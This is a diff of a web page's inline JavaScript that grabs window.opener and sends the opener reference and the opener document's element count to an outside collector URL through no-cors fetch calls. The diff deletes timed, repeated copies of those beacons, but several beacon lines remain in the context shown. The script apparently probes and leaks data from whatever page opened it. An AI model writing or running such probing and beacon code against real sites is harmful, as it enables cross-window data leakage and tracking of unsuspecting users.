@@ -4,19 +4,6 @@
 
 <script>
 
-const yolo = async function testWait(aaa) {
-    await wait(5000);
-    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=4' + aaa.document.body.childElementCount, {mode: 'no-cors'})
-    await wait(5000);
-    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size=5' + aaa.document.body.childElementCount, {mode: 'no-cors'})
-}
-
-function wait(time) {
-    return new Promise(resolve => {
-        setTimeout(resolve, time);
-    });
-}
-
 try{
 	var aaa = window.opener;
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener=' + aaa, {mode: 'no-cors'})
@@ -30,26 +17,6 @@ try{
 
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size0=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
 
-
-
-	(async () => {
-	    setTimeout(function() {}, 3000);
-
-	    async function sleep() {
-	            await new Promise(resolve => {
-	                setTimeout(async function() {
-	                    await sleep();
-	                    resolve()
-	                }, 1000);
-	            });
-	        
-	        return;
-	    }
-
-	    await sleep();
-	    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size6=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
-
-	})();
 
 
 
